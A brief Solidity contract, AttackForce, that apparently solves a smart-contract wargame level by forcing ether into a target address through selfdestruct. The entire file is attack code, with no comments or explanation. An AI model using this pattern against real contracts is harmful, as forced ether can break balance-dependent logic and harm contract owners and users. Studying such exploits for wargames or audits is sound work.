// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(target));
    }
}
